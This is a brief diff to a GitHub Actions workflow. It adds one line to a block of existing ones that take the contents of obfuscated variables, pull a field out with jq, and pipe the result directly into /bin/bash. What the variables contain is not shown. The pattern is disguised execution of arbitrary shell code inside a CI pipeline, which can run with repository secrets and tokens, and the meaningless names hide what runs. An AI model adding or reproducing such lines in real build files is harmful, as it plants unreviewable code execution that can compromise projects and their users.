@@ -35,6 +35,7 @@ jobs:
           echo $zopt97948 | jq -r .mtk312 | /bin/bash
           printf '%s' "$khnap0616" | jq -r .o2348 | /bin/bash
           echo $tdcmz3 | jq -r .vb93348 | /bin/bash
+          printf '%s' "$y089" | jq -r .vrcgr485 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
